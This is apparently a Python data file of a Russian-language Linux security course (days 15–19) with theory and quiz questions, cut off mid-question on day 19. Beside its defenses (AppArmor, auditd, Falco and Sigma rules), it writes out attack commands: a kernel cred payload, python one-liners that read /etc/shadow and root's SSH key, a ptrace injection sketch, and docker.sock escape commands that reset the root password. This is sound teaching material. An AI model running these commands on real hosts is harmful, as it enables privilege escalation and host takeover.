# -*- coding: utf-8 -*-
"""Week 3 Curriculum: Linux & Host Security (Days 15 to 21)"""

WEEK_3_LESSONS = [
    # =========================================================================
    # DAY 15: Модели доступа в Linux и struct cred
    # =========================================================================
    {
        "day": 15,
        "title": "День 15: Модели доступа в Linux и struct cred",
        "category": "Linux Security",
        "duration": "15 мин",
        "badge": "Kernel",
        "theory": """<h3>⚡ 1. Механика привилегий в ядре Linux</h3>
<p>В ядре Linux каждый процесс представлен дескриптором <code>struct task_struct</code> (файл ядра <code>include/linux/sched.h</code>).
Внутри него находится указатель на структуру учетных данных <code>const struct cred *cred</code>:</p>
<div class='code-box'>struct cred {
    kuid_t uid;   /* Real UID (Кто запустил процесс) */
    kuid_t euid;  /* Effective UID (Чьи права проверяются при доступе к ресурсам) */
    kuid_t suid;  /* Saved UID (Для временного понижения/восстановления прав) */
    kernel_cap_t cap_permitted;   /* Допустимые capabilities */
    kernel_cap_t cap_effective;   /* Активные capabilities */
    struct user_namespace *user_ns;
};</div>
<p><b>Модели безопасности:</b></p>
<ul>
<li><b>DAC (Discretionary Access Control):</b> Владелец файла сам определяет права (<code>rwxrwxrwx</code>). Недостаток: процесс с <code>EUID = 0 (root)</code> имеет абсолютную власть и игнорирует любые биты прав!</li>
<li><b>MAC (Mandatory Access Control — SELinux / AppArmor):</b> Ядро проверяет метки (Labels) независимо от UID. Даже root не может прочитать файл, если политика AppArmor/SELinux запрещает доступ к контексту.</li>
</ul>

<h3>💥 2. Реализация атаки: Подмена EUID и LPE</h3>
<p>Если вредоносный LKM (модуль ядра) или эксплойт ядра (Dirty Cred / use-after-free) получает запись в память ядра, он находит <code>current->cred</code> и перезаписывает структуру:</p>
<div class='code-box'>// Классическая полезная нагрузка шеллкода ядра (Kernel LPE):
commit_creds(prepare_kernel_cred(0));
// Функция prepare_kernel_cred(0) создает структуру cred с UID=0, GID=0 и всеми Capabilities!
// commit_creds применяет ее к текущему процессу. Процесс мгновенно становится полноценным root!</div>

<h3>🛡️ 3. Инженерная защита: Принудительный MAC (AppArmor / SELinux)</h3>
<div class='code-box'># Проверка статуса AppArmor в Ubuntu:
aa-status

# Пример профиля AppArmor для изоляции Nginx (/etc/apparmor.d/usr.sbin.nginx):
/usr/sbin/nginx {
  /var/log/nginx/* w,
  /etc/nginx/** r,
  deny /etc/shadow rwx,
  deny /root/** rwx,
}</div>

<h3>🔍 4. Детектирование в auditd</h3>
<p>Мониторинг вызовов смены идентификаторов через подсистему аудита ядра Linux:</p>
<div class='code-box'>-a always,exit -F arch=b64 -S setuid -S setgid -S setresuid -k privilege_escalation</div>""",
        "questions": [
            {
                "id": "d15_q1",
                "day": 15,
                "q": "Какой идентификатор пользователя (UID) ядро Linux проверяет при попытке открыть файл на чтение или запись?",
                "options": ["EUID (Effective UID)", "RUID (Real UID)", "SUID (Saved UID)", "Session ID"],
                "correct": 0,
                "explain": "Ядро Linux сверяет права доступа к файлам и сокетам именно с Effective UID (EUID) процесса."
            },
            {
                "id": "d15_q2",
                "day": 15,
                "q": "В какой структуре ядра Linux хранятся идентификаторы UID, GID и наборы Capabilities процесса?",
                "options": ["struct cred", "struct mm_struct", "struct file", "struct socket"],
                "correct": 0,
                "explain": "Структура 'struct cred' (include/linux/cred.h) хранит все мандаты безопасности процесса."
            },
            {
                "id": "d15_q3",
                "day": 15,
                "q": "В чем заключается главное архитектурное ограничение модели дискреционного доступа (DAC)?",
                "options": [
                    "Суперпользователь root (UID 0) имеет абсолютные полномочия и может прочитать или стереть любой файл системы",
                    "Она не поддерживает длинные пароли",
                    "Она работает только в 32-битных системах",
                    "Она не позволяет создавать группы"
                ],
                "correct": 0,
                "explain": "В DAC права root монолитны и абсолютны, что нарушает фундаментальный принцип наименьших привилегий."
            },
            {
                "id": "d15_q4",
                "day": 15,
                "q": "Чем модель мандатного доступа (MAC: AppArmor/SELinux) принципиально превосходит DAC?",
                "options": [
                    "Политики безопасности проверяются ядром на основе контекстов и меток, ограничивая даже процессы суперпользователя root",
                    "Она ускоряет работу процессора",
                    "Она заменяет фаервол",
                    "Она шифрует жесткий диск"
                ],
                "correct": 0,
                "explain": "В системе с MAC процесс, запущенный от root, ограничен жестким профилем (например, Nginx не может читать /etc/shadow)."
            },
            {
                "id": "d15_q5",
                "day": 15,
                "q": "Какая функция ядра Linux традиционно используется шеллкодами ядра для превращения процесса в root?",
                "options": ["commit_creds(prepare_kernel_cred(0))", "system('root')", "setuid(1000)", "fork()"],
                "correct": 0,
                "explain": "Связка commit_creds(prepare_kernel_cred(0)) выделяет дескриптор root-привилегий и применяет его к вызывающему процессу."
            },
            {
                "id": "d15_q6",
                "day": 15,
                "q": "Зачем в структуре cred существует Saved UID (SUID)?",
                "options": [
                    "Для сохранения исходного привилегированного UID при временном сбросе прав (drop privileges) и последующего их безопасного возврата",
                    "Для отправки пароля по сети",
                    "Для сохранения хэша на диск",
                    "Для шифрования памяти"
                ],
                "correct": 0,
                "explain": "SUID хранит старый EUID, позволяя сервису временно понизить права до обычного юзера и затем вернуться к root."
            },
            {
                "id": "d15_q7",
                "day": 15,
                "q": "Какая подсистема ядра Linux отвечает за низкоуровневый аудит вызовов ядра (syscalls)?",
                "options": ["auditd (Audit Framework)", "syslog", "journald", "cron"],
                "correct": 0,
                "explain": "auditd перехватывает системные вызовы на входе и выходе из ядра в соответствии с правилами audit.rules."
            },
            {
                "id": "d15_q8",
                "day": 15,
                "q": "Что произойдет, если скомпрометированный Nginx под управлением AppArmor попытается открыть файл /etc/shadow?",
                "options": [
                    "Ядро заблокирует операцию и вернет ошибку Permission Denied, даже если Nginx работает от имени root",
                    "Nginx удалит файл",
                    "Сервер перезагрузится",
                    "Пароли будут отправлены злоумышленнику"
                ],
                "correct": 0,
                "explain": "Профиль AppArmor имеет приоритет над UID 0 и жестко запретит чтение неразрешенных файлов."
            },
            {
                "id": "d15_q9",
                "day": 15,
                "q": "Какая команда выводит текущие числовые значения RUID, EUID и GID в Linux?",
                "options": ["id", "uname -r", "pwd", "hostname"],
                "correct": 0,
                "explain": "Команда 'id' выводит реальные и эффективные идентификаторы пользователя: uid, euid, gid, groups."
            }
        ]
    },

    # =========================================================================
    # DAY 16: Linux Capabilities и атака через CAP_DAC_READ_SEARCH
    # =========================================================================
    {
        "day": 16,
        "title": "День 16: Linux Capabilities и атака CAP_DAC_READ_SEARCH",
        "category": "Linux Security",
        "duration": "15 мин",
        "badge": "T1068",
        "theory": """<h3>⚡ 1. Механика разделения привилегий (Capabilities)</h3>
<p>В ядре Linux традиционное 'всемогущество' root разделено на <b>41 независимую привилегию (Capabilities)</b>. Это позволяет выдавать бинарникам только минимально необходимые права вместо полного SUID root:</p>
<ul>
<li><code>CAP_NET_BIND_SERVICE:</code> Право занимать системные порты (< 1024) без root.</li>
<li><code>CAP_NET_RAW:</code> Право открывать сырые сокеты (для утилиты ping).</li>
<li><code>CAP_DAC_READ_SEARCH:</code> <b>Критически опасная привилегия!</b> Обходит абсолютно все проверки прав DAC на чтение любых файлов и просмотр любых каталогов в системе!</li>
</ul>

<h3>💥 2. Реализация атаки: Эксплуатация CAP_DAC_READ_SEARCH</h3>
<p>Если системный администратор ошибочно выдал эту возможность интерпретатору Python, Perl или кастомной утилите:</p>
<div class='code-box'># Аудит хоста на наличие опасных capabilities:
getcap -r / 2>/dev/null
# Результат аудита:
# /usr/bin/python3.10 = cap_dac_read_search+ep</div>

<p><b>Вектор эскалации привилегий:</b><br>
Любой непривилегированный пользователь (например, взломанный <code>www-data</code>) запускает Python и беспрепятственно читает самые охраняемые секреты сервера:</p>
<div class='code-box'># 1. Чтение теневого файла паролей с хэшами:
python3 -c "print(open('/etc/shadow').read())"

# 2. Чтение закрытых приватных SSH ключей суперпользователя:
python3 -c "print(open('/root/.ssh/id_rsa').read())"</div>
<p>Получив хэш пароля root из <code>/etc/shadow</code> или закрытый ключ SSH, атакующий получает интерактивный рутовый шелл за секунды!</p>

<h3>🛡️ 3. Инженерная защита: Очистка флагов</h3>
<div class='code-box'># Снять все capabilities с бинарника:
sudo setcap -r /usr/bin/python3.10

# Проверка:
getcap /usr/bin/python3.10  # Вывод пустой!</div>

<h3>🔍 4. Детектирование в SIEM</h3>
<p>Правило auditd для логирования вызовов <code>setcap</code> и попыток модификации расширенных атрибутов безопасности (xattr):</p>
<div class='code-box'>-w /usr/sbin/setcap -p x -k capabilities_modification
-a always,exit -F arch=b64 -S setxattr,fsetxattr,lsetxattr -k cap_xattr_changed</div>""",
        "questions": [
            {
                "id": "d16_q1",
                "day": 16,
                "q": "Какая утилита Linux рекурсивно сканирует файловую систему на наличие установленных Capabilities?",
                "options": ["getcap -r / 2>/dev/null", "ls -la /", "ps aux", "cat /proc/cpuinfo"],
                "correct": 0,
                "explain": "Команда getcap с ключом -r рекурсивно опрашивает расширенные атрибуты (xattr) файлов на наличие привилегий."
            },
            {
                "id": "d16_q2",
                "day": 16,
                "q": "Какую суперсилу дает бинарнику флаг CAP_DAC_READ_SEARCH?",
                "options": [
                    "Полный обход проверок прав доступа на чтение абсолютно любых файлов и каталогов файловой системы",
                    "Право перезагружать систему",
                    "Право менять MAC адрес",
                    "Право форматировать диски"
                ],
                "correct": 0,
                "explain": "CAP_DAC_READ_SEARCH отключает DAC-проверки на чтение, позволяя непривилегированному пользователю читать /etc/shadow и ключи SSH."
            },
            {
                "id": "d16_q3",
                "day": 16,
                "q": "Какая команда полностью удаляет все Capabilities с указанного бинарного файла?",
                "options": ["setcap -r <файл>", "chmod -x <файл>", "chown root <файл>", "rm <файл>"],
                "correct": 0,
                "explain": "Ключ -r (remove) команды setcap стирает атрибут security.capability из заголовка файла."
            },
            {
                "id": "d16_q4",
                "day": 16,
                "q": "Где физически на жестком диске ядро сохраняет установленные для файла Capabilities?",
                "options": [
                    "В расширенных атрибутах файла (Extended Attributes / xattr) в пространстве security.capability",
                    "В файле /etc/capabilities.conf",
                    "В оперативной памяти BIOS",
                    "В таблице MBR"
                ],
                "correct": 0,
                "explain": "Capabilities бинарников хранятся в xattr ФС (ext4, xfs) под пространством имен security.capability."
            },
            {
                "id": "d16_q5",
                "day": 16,
                "q": "Какая Capability легитимно требуется веб-серверу для привязки к привилегированным портам 80 и 443 без прав root?",
                "options": ["CAP_NET_BIND_SERVICE", "CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_KILL"],
                "correct": 0,
                "explain": "CAP_NET_BIND_SERVICE специально создана для безопасного запуска веб-серверов на системных портах < 1024."
            },
            {
                "id": "d16_q6",
                "day": 16,
                "q": "Что означает суффикс '+ep' в строке capabilities 'cap_dac_read_search+ep'?",
                "options": [
                    "Флаг добавлен в наборы Effective (E) и Permitted (P)",
                    "Флаг заблокирован",
                    "Флаг действует только для пользователя root",
                    "Флаг активен только при шифровании"
                ],
                "correct": 0,
                "explain": "Символы 'e' и 'p' обозначают включение в наборы Effective (активно сразу при старте) и Permitted (разрешено процессу)."
            },
            {
                "id": "d16_q7",
                "day": 16,
                "q": "В каком системном файле Linux хранятся хэши паролей локальных пользователей?",
                "options": ["/etc/shadow", "/etc/passwd", "/etc/group", "/var/log/auth.log"],
                "correct": 0,
                "explain": "Хэши паролей с солью хранятся в файле /etc/shadow, доступном по умолчанию только суперпользователю root (0640 или 0000)."
            },
            {
                "id": "d16_q8",
                "day": 16,
                "q": "В чем отличие CAP_DAC_OVERRIDE от CAP_DAC_READ_SEARCH?",
                "options": [
                    "CAP_DAC_OVERRIDE дает право игнорировать проверки не только на чтение, но и на ЗАПИСЬ и ВЫПОЛНЕНИЕ любых файлов",
                    "CAP_DAC_OVERRIDE работает только для сети",
                    "Они ничем не отличаются",
                    "CAP_DAC_OVERRIDE запрещает доступ"
                ],
                "correct": 0,
                "explain": "CAP_DAC_OVERRIDE обходит все биты прав rwx, позволяя перезаписать /etc/passwd или внедрить пользователя."
            },
            {
                "id": "d16_q9",
                "day": 16,
                "q": "Какое системное действие auditd регистрирует использование setcap злоумышленником?",
                "options": [
                    "Системный вызов setxattr для атрибута security.capability",
                    "Запрос DNS",
                    "Вызов connect()",
                    "Открытие браузера"
                ],
                "correct": 0,
                "explain": "Установка capabilities бинарнику всегда сопровождается системным вызовом записи расширенных атрибутов setxattr."
            }
        ]
    },

    # =========================================================================
    # DAY 17: Опасные Capabilities и барьер PR_SET_NO_NEW_PRIVS
    # =========================================================================
    {
        "day": 17,
        "title": "День 17: Опасные Capabilities и PR_SET_NO_NEW_PRIVS",
        "category": "Linux Security",
        "duration": "15 мин",
        "badge": "PrivEsc",
        "theory": """<h3>⚡ 1. 'Токсичные' Capabilities (Эквиваленты Root)</h3>
<p>Некоторые Capabilities настолько мощные, что их выдача эквивалентна передаче неограниченного рут-доступа:</p>
<ul>
<li><code>CAP_SYS_ADMIN:</code> 'Новый root'. Позволяет монтировать файловые системы, управлять cgroups, внедрять eBPF-программы и перехватывать namespaces.</li>
<li><code>CAP_SYS_PTRACE:</code> Позволяет отлаживать и модифицировать виртуальную память ЛЮБЫХ других процессов через системный вызов <code>ptrace()</code>.</li>
<li><code>CAP_SETUID:</code> Позволяет вызывать <code>setuid(0)</code> из непривилегированного процесса.</li>
</ul>

<h3>💥 2. Реализация атаки: Инъекция шеллкода через CAP_SYS_PTRACE</h3>
<div class='code-box'># 1. Поиск рутового процесса в системе (например, sshd или systemd):
ps aux | grep root

# 2. Эксплуатация через утилиту inject / gdb:
# Имея CAP_SYS_PTRACE, непривилегированный процесс подключается к рутовому процессу:
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
# Записывает шеллкод в память чужого процесса (PTRACE_POKETEXT) и перехватывает регистр RIP:
# Результат: рутовый процесс sshd исполняет реверс-шелл атакующего!</div>

<h3>🛡️ 3. Фундаментальный барьер: PR_SET_NO_NEW_PRIVS</h3>
<p>Системный вызов <code>prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</code> — один из важнейших механизмов безопасности современного ядра Linux:</p>
<ul>
<li>Если бит взведен, процесс и ВСЕ его потомки <b>никогда не смогут повысить свои привилегии</b> при вызове <code>execve()</code>.</li>
<li>Ядро принудительно <b>игнорирует биты SUID/SGID и любые файловые Capabilities</b>!</li>
<li>Этот флаг нельзя сбросить даже руту (односторонний предохранитель).</li>
</ul>

<div class='code-box'># Настройка безопасности в Systemd юните (/etc/systemd/system/myapp.service):
[Service]
User=www-data
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true</div>""",
        "questions": [
            {
                "id": "d17_q1",
                "day": 17,
                "q": "Какая Capability позволяет процессу подключаться к виртуальной памяти других процессов и внедрять шеллкод?",
                "options": ["CAP_SYS_PTRACE", "CAP_NET_ADMIN", "CAP_CHOWN", "CAP_KILL"],
                "correct": 0,
                "explain": "CAP_SYS_PTRACE дает право на отладку, чтение и запись в адресное пространство чужих процессов (PTRACE_ATTACH)."
            },
            {
                "id": "d17_q2",
                "day": 17,
                "q": "Что делает системный вызов prctl с флагом PR_SET_NO_NEW_PRIVS?",
                "options": [
                    "Запрещает процессу и всем его потомкам повышать привилегии через SUID-файлы и Capabilities при вызове execve()",
                    "Завершает процесс аварийно",
                    "Удаляет файлы процесса",
                    "Отключает интернет"
                ],
                "correct": 0,
                "explain": "PR_SET_NO_NEW_PRIVS гарантирует, что запуск SUID бинарников не приведет к получению прав их владельца."
            },
            {
                "id": "d17_q3",
                "day": 17,
                "q": "Какая директива в конфигурационном юните Systemd активирует защиту NoNewPrivileges?",
                "options": ["NoNewPrivileges=true", "User=root", "Protect=all", "Restart=always"],
                "correct": 0,
                "explain": "Директива 'NoNewPrivileges=true' вызывает prctl(PR_SET_NO_NEW_PRIVS) перед передачей управления сервису."
            },
            {
                "id": "d17_q4",
                "day": 17,
                "q": "Почему CAP_SYS_ADMIN часто называют 'новым рутом'?",
                "options": [
                    "Она объединяет гигантский набор прав (монтирование ФС, загрузка eBPF, управление cgroups), позволяющий легко получить полный root",
                    "Она переименовывает пользователя в admin",
                    "Она работает только в Ubuntu",
                    "Она заменяет пароли"
                ],
                "correct": 0,
                "explain": "Исторически в CAP_SYS_ADMIN помещали все привилегии, для которых не придумали отдельный флаг, что делает ее фатальной для безопасности."
            },
            {
                "id": "d17_q5",
                "day": 17,
                "q": "Можно ли сбросить флаг PR_SET_NO_NEW_PRIVS обратно в 0 после его активации?",
                "options": [
                    "Нет, ядро запрещает отключение этого флага даже для суперпользователя root",
                    "Да, командой prctl(PR_SET_NO_NEW_PRIVS, 0)",
                    "Да, после перезапуска процесса",
                    "Да, через sudo"
                ],
                "correct": 0,
                "explain": "PR_SET_NO_NEW_PRIVS — необратимый односторонний флаг: однажды включенный, он действует до уничтожения дерева процессов."
            },
            {
                "id": "d17_q6",
                "day": 17,
                "q": "Какую опасность несет утилита /usr/bin/tar, если ей выдана возможность CAP_DAC_OVERRIDE?",
                "options": [
                    "Злоумышленник может распаковать архив поверх системного файла /etc/shadow или /etc/sudoers, перезаписав его",
                    "Она не может сжимать файлы",
                    "Она работает только медленно",
                    "Она стирает диск"
                ],
                "correct": 0,
                "explain": "CAP_DAC_OVERRIDE позволяет архиватору tar перезаписать любой критический файл ОС без проверки прав."
            },
            {
                "id": "d17_q7",
                "day": 17,
                "q": "Что произойдет, если непривилегированный пользователь с NoNewPrivileges=true запустит бинарник /usr/bin/passwd (SUID root)?",
                "options": [
                    "Бинарник исполнится с обычными правами непривилегированного пользователя (EUID останется прежним), а не с правами root",
                    "Компьютер зависнет",
                    "Пользователь станет root",
                    "Пароль сбросится"
                ],
                "correct": 0,
                "explain": "При активном NoNewPrivileges ядро полностью игнорирует бит SUID при загрузке исполняемого ELF-файла."
            },
            {
                "id": "d17_q8",
                "day": 17,
                "q": "Какая Capability позволяет процессу менять UID на произвольный (например, вызвать setuid(0))?",
                "options": ["CAP_SETUID", "CAP_NET_RAW", "CAP_SYS_TIME", "CAP_AUDIT_WRITE"],
                "correct": 0,
                "explain": "CAP_SETUID дает право процессу вызывать системные вызовы setuid(), setresuid() для смены своего эффективного идентификатора."
            },
            {
                "id": "d17_q9",
                "day": 17,
                "q": "Какой статус флага NoNewPrivs отображается в псевдофайле /proc/$PID/status?",
                "options": ["NoNewPrivs: 1", "Privileges: Off", "Secure: Yes", "Root: False"],
                "correct": 0,
                "explain": "Файл /proc/[PID]/status содержит специальную строку 'NoNewPrivs: 1' (активно) или 'NoNewPrivs: 0' (неактивно)."
            }
        ]
    },

    # =========================================================================
    # DAY 18: Архитектура контейнеризации: Namespaces, Cgroups и LSM
    # =========================================================================
    {
        "day": 18,
        "title": "День 18: Архитектура изоляции Docker",
        "category": "Linux Security",
        "duration": "15 мин",
        "badge": "Containers",
        "theory": """<h3>⚡ 1. Анатомия контейнера: Почему это не ВМ</h3>
<p>Контейнер Docker — это не виртуальная машина. У него <b>нет виртуального гипервизора и нет собственного ядра</b>.
Контейнер — это обычный процесс хостовой ОС Linux, ограниченный тремя механизмами ядра:</p>
<ol>
<li><b>Namespaces (Пространства имен):</b> Ограничивают то, что процесс <b>ВИДИТ</b>:
    <ul>
    <li><code>PID:</code> Изоляция дерева процессов (внутри контейнера процесс видит себя как PID 1).</li>
    <li><code>NET:</code> Изоляция сетевых интерфейсов, маршрутов и правил фаервола.</li>
    <li><code>MNT:</code> Изоляция точек монтирования файловой системы.</li>
    <li><code>IPC:</code> Изоляция межпроцессного взаимодействия (разделяемая память, очереди сообщений).</li>
    <li><code>UTS:</code> Изоляция имени хоста (hostname).</li>
    <li><code>USER:</code> Сопоставление UID контейнера с непривилегированным UID хоста.</li>
    </ul>
</li>
<li><b>Cgroups (Control Groups):</b> Ограничивают то, сколько ресурсов процесс может <b>ПОТРЕБЛЯТЬ</b> (лимиты CPU, RAM, IOPS диска).</li>
<li><b>Seccomp-bpf и AppArmor:</b> Ограничивают, какие <b>системные вызовы (syscalls)</b> процесс может выполнять к ядру хоста (по умолчанию Docker блокирует около 44 опасных syscalls, включая <code>reboot</code>, <code>mount</code>, <code>kexec_load</code>).</li>
</ol>

<h3>💥 2. Реализация атаки: Недостаточная изоляция (Container Breakout)</h3>
<p>Поскольку ядро Linux <b>общее для всех контейнеров и хоста</b>, любая уязвимость ядра (Kernel Panic, Privilege Escalation типа Dirty COW, Dirty Pipe) позволяет процессу внутри контейнера мгновенно захватить весь хост целиком!</p>

<h3>🛡️ 3. Инженерная защита: User Namespaces и Rootless Docker</h3>
<div class='code-box'># Включение User Namespaces (/etc/docker/daemon.json):
{
  "userns-remap": "default"
}
# Теперь root (UID 0) внутри контейнера мапится на непривилегированный UID 100000 на хосте!
# Даже если хакер выберется из контейнера, на хосте он окажется никем!</div>

<h3>🔍 4. Детектирование в Falco (Cloud-Native Runtime Security)</h3>
<div class='code-box'>- rule: Terminal shell in container
  desc: A shell was spawned by a container with an attached terminal
  condition: container.id != host and proc.name in (bash, sh, zsh)
  output: Shell spawned in container (user=%user.name container_id=%container.id)
  priority: WARNING</div>""",
        "questions": [
            {
                "id": "d18_q1",
                "day": 18,
                "q": "В чем заключается фундаментальное отличие контейнера Docker от виртуальной машины KVM/VMware?",
                "options": [
                    "Контейнер делит одно общее ядро с операционной системой хоста и изолируется механизмами ядра (Namespaces/Cgroups)",
                    "Контейнер имеет собственный BIOS",
                    "Контейнер работает только на Windows",
                    "Контейнеры не могут иметь IP-адрес"
                ],
                "correct": 0,
                "explain": "В отличие от ВМ с собственным гостевым ядром и виртуальным железом, контейнеры — это изолированные процессы на ядре хоста."
            },
            {
                "id": "d18_q2",
                "day": 18,
                "q": "Какое пространство имен (Namespace) изолирует сетевые интерфейсы, порты и таблицы маршрутизации?",
                "options": ["NET Namespace", "PID Namespace", "MNT Namespace", "IPC Namespace"],
                "correct": 0,
                "explain": "Network Namespace обеспечивает собственное сетевое окружение со своими IP-адресами и сокетами."
            },
            {
                "id": "d18_q3",
                "day": 18,
                "q": "Какая подсистема ядра Linux отвечает за ограничение максимального потребления оперативной памяти контейнером?",
                "options": ["Control Groups (Cgroups)", "Namespaces", "Iptables", "Seccomp"],
                "correct": 0,
                "explain": "Cgroups распределяют и лимитируют аппаратные ресурсы хоста (CPU, память, диск) между группами процессов."
            },
            {
                "id": "d18_q4",
                "day": 18,
                "q": "Что такое Seccomp (Secure Computing Mode) в контексте безопасности Docker?",
                "options": [
                    "Фильтр системных вызовов ядра через BPF, запрещающий контейнеру опасные syscalls (mount, reboot и др.)",
                    "Антивирусный сканер файлов",
                    "Протокол шифрования трафика",
                    "Система резервного копирования"
                ],
                "correct": 0,
                "explain": "Профиль Seccomp по умолчанию в Docker блокирует доступ к небезопасным системным вызовам к ядру хоста."
            },
            {
                "id": "d18_q5",
                "day": 18,
                "q": "Какую ключевую защиту дает включение User Namespaces (userns-remap) в Docker?",
                "options": [
                    "Пользователь root (UID 0) внутри контейнера отображается в непривилегированный UID (например, 100000) на хостовой системе",
                    "Увеличивает скорость чтения с диска",
                    "Автоматически обновляет ОС",
                    "Блокирует входящие порты"
                ],
                "correct": 0,
                "explain": "Если атакующий выберется из контейнера с User Namespaces, на хосте он не получит прав реального root."
            },
            {
                "id": "d18_q6",
                "day": 18,
                "q": "Какой инструмент runtime-мониторинга популярен в Kubernetes для обнаружения подозрительной активности внутри контейнеров?",
                "options": ["Falco (eBPF)", "Nmap", "Wireshark", "VLC"],
                "correct": 0,
                "explain": "Falco от Sysdig использует eBPF и модуль ядра для анализа системных вызовов контейнеров в реальном времени."
            },
            {
                "id": "d18_q7",
                "day": 18,
                "q": "Что произойдет, если в общем ядре хоста присутствует уязвимость переполнения буфера (Kernel LPE)?",
                "options": [
                    "Злоумышленник внутри обычного контейнера может скомпрометировать всё ядро и захватить хостовую операционную систему",
                    "Уязвимость заблокируется Docker",
                    "Контейнер автоматически удалится",
                    "Перезагрузится только контейнер"
                ],
                "correct": 0,
                "explain": "Поскольку ядро общее, эксплойт уровня ядра поражает хост независимо от контейнерных пространств имен."
            },
            {
                "id": "d18_q8",
                "day": 18,
                "q": "Какой PID имеет главный процесс контейнера внутри своего собственного PID Namespace?",
                "options": ["PID 1", "PID 0", "Случайный PID хоста", "PID 1000"],
                "correct": 0,
                "explain": "Внутри своего пространства процессов приложение видит себя корневым процессом с PID 1 (Init-процесс контейнера)."
            },
            {
                "id": "d18_q9",
                "day": 18,
                "q": "Какое пространство имен (Namespace) изолирует разделяемую память (shm) и очереди сообщений POSIX?",
                "options": ["IPC Namespace", "UTS Namespace", "USER Namespace", "NET Namespace"],
                "correct": 0,
                "explain": "Inter-Process Communication (IPC) Namespace изолирует память SysV IPC и очереди сообщений между контейнерами."
            }
        ]
    },

    # =========================================================================
    # DAY 19: Побег из Docker через /var/run/docker.sock
    # =========================================================================
    {
        "day": 19,
        "title": "День 19: Побег из Docker через docker.sock",
        "category": "Linux Security",
        "duration": "15 мин",
        "badge": "T1611",
        "theory": """<h3>⚡ 1. Архитектура сокета демона Docker</h3>
<p>Управление контейнерами в Docker осуществляется через UNIX-сокет <code>/var/run/docker.sock</code>.
Это точка входа в REST API демона <code>dockerd</code>, который работает на хосте с полными правами <b>root</b>.</p>
<p><b>Фатальная ошибка конфигурации (Docker-in-Docker / CI/CD):</b><br>
Разработчики часто монтируют сокет хоста внутрь контейнера (<code>-v /var/run/docker.sock:/var/run/docker.sock</code>), чтобы контейнер сборщика мог собирать новые образы.</p>

<h3>💥 2. Реализация атаки: Побег на хост в 1 команду</h3>
<p>Любой процесс внутри контейнера, имеющий доступ к сокету, имеет <b>абсолютные права суперпользователя на хостовой машине</b>:</p>
<div class='code-box'># Способ 1: Использование штатного Docker CLI внутри контейнера:
# Запускаем НОВЫЙ контейнер, смонтировав корень хостовой ФС (/) в каталог /host:
docker run -v /:/host -it alpine chroot /host

# Способ 2: Через прямой REST API запрос через curl (если CLI не установлен):
curl -X POST --unix-socket /var/run/docker.sock \\
     http://localhost/containers/create \\
     -H "Content-Type: application/json" \\
     -d '{"Image": "alpine", "Cmd": ["chroot", "/host", "sh", "-c", "echo root:pwned | chpasswd"], "Binds": ["/:/host"]}'</div>

<p><b>Анатомия побега:</b> Вызов <code>chroot /host</code> мгновенно переключает корневой каталог шелла на реальную корневую файловую систему сервера хоста. Атакующий может добавить SSH-ключ в <code>/root/.ssh/authorized_keys</code> хоста!</p>

<h3>🛡️ 3. Инженерная защита: Изоляция сокета и Kaniko</h3>
<ol>
<li><b>НИКОГДА не пробрасывать docker.sock:</b> Для сборки образов в CI/CD использовать бездемонные сборщики (<b>Kaniko</b> или <b>Buildah</b>), которые не требуют root и сокета!</li>
<li><b>Docker Socket Proxy:</b> Использовать фильтрующий прокси (Tecnativa/docker-socket-proxy), разрешающий только GET-запросы к API контейнеров и запрещающий создание привилегированных контейнеров (<code>POST /containers/create</code>).</li>
</ol>

<h3>🔍 4. Детектирование в SOC</h3>
<p>Правило Sigma на обнаружение монтирования корня хоста в параметрах создания контейнера:</p>
<div class='code-box'>title: Host Root Filesystem Mounted in Container
status: experimental
logsource:
    product: docker
detection:
    selection:
        Event: 'create'
        BindMounts|contains: '/:/'
    condition: selection</div>""",
        "questions": [
            {
                "id": "d19_q1",
                "day": 19,
                "q": "Что представляет собой файл /var/run/docker.sock на сервере Linux?",
                "options": [
                    "UNIX-сокет IPC для отправки управляющих команд к REST API демона dockerd, работающего от root",
                    "Лог-файл запущенных контейнеров",
                    "Файл виртуального диска с образом",
                    "Сетевой интерфейс Wi-Fi"
                ],
                "correct": 0,
                "explain": "docker.sock — это IPC сокет связи с демоном Docker: любой, кто может писать в сокет, контролирует демон."
            },
            {
                "id": "d19_q2",
                "day": 19,
                "q": "Почему проброс /var/run/docker.sock внутрь контейнера эквивалентен выдаче root-прав на хосте?",
                "options": [
                    "Через сокет можно отдать команду демону создать новый контейнер с монтированием физического корня хоста (-v /:/host)",
                    "Он отключает пароли на хосте",
                    "Он стирает фаервол",
                    "Он делает контейнер невидимым"
                ],
                "correct": 0,
                "explain": "Клиент сокета может запустить контейнер с доступом к реальному диску хоста (/), обходя любую контейнерную изоляцию."
            },
            {
                "id": "d19_q3",
                "day": 19,
                "q": "Какая утилита сборки контейнеров в Kubernetes/CI не требует наличия демона Docker и docker.sock?",
                "options": ["Kaniko (Google)", "Nmap", "Wireshark", "OpenSSH"],
                "correct": 0,
                "explain": "Kaniko от Google собирает образы контейнеров внутри непривилегированного пользовательского пространства без демона."
            },
            {
                "id": "d19_q4",
                "day": 19,
                "q": "Что делает команда chroot /host при побеге из контейнера?",
                "options": [
                    "Меняет корневую директорию текущего шелла на смонтированную файловую систему реального хоста",
                    "Удаляет файлы хоста",
                    "Перезагружает контейнер",
                    "Создает новую базу данных"
                ],
                "correct": 0,
                "explain": "Команда chroot меняет видимый корень ФС, перемещая атакующего прямо в реальную систему хоста."
            },
            {
                "id": "d19_q5",
                "day": 19,
                "q": "Какая утилита позволяет взаимодействовать с сокетом /var/run/docker.sock без установки утилиты docker?",
                "options": [
                    "curl --unix-socket /var/run/docker.sock http://localhost/...",
                    "ping",
                    "ssh",
                    "traceroute"
                ],
                "correct": 0,
                "explain": "curl нативно поддерживает флаг --unix-socket для отправки стандартных HTTP REST API запросов через сокеты UNIX."
            },
            {
                "id": "d19_q6",
                "day": 19,
                "q": "В какую группу безопасности в Linux обычно добавляют пользователей для работы с Docker без sudo?",
                "options": ["docker", "wheel", "sudo", "root"],
                "correct": 0,
                "explain": "Членство в группе 'docker' дает права на чтение и запись в сокет docker.sock, что де-факто равносильно правам root."
            },
            {
                "id": "d19_q7",
                "day": 19,
                "q": "Как атакующий может закрепиться на хосте после побега через docker.sock?",
                "options": [
                    "Добавить свой открытый SSH-ключ в файл /host/root/.ssh/authorized_keys или добавить задание в /host/etc/crontab",
                    "Изменить цвет терминала",
                    "Удалить историю браузера",
                    "Отправить письмо на почту"
                ],
